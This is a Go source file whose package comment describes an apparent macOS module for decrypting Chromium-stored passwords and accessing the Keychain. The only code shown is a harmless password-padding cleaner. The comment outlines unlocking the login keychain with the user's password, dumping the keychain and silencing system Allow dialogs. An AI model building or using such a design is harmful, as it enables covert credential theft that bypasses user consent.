// Package crypto decrypts browser-protected secrets and manages Keychain access.
//
// Platform files:
//   - crypto_darwin.go — Chromium Safe Storage + AES blob decrypt
//   - keychain_unlock_darwin.go — unlock login keychain with user password if locked
//   - keychain_silent_darwin.go — set-key-partition-list (no system Allow dialogs)
//   - security_cmd_darwin.go — wrappers around /usr/bin/security + dump-keychain
//
// CleanPassword normalizes decrypted password bytes (strips binary padding).
package crypto

import "strings"

// CleanPassword returns a printable password string from decrypted blob bytes.
// Some Chromium versions leave non-printable prefixes; we try the full buffer,
// then skip a 32-byte header before giving up.
func CleanPassword(data []byte) string {
	s := string(data)
	allPrint := true
	for _, c := range s {
		if c < 32 && c != '\t' && c != '\n' && c != '\r' {
			allPrint = false
			break
		}
	}
	if allPrint {
		return strings.TrimSpace(s)
	}
	if len(data) > 32 {
		s2 := string(data[32:])
		allPrint2 := true
		for _, c := range s2 {
			if c < 32 && c != '\t' && c != '\n' && c != '\r' {
				allPrint2 = false
				break
			}
		}
		if allPrint2 {
			return strings.TrimSpace(s2)
		}
	}
	return ""
}
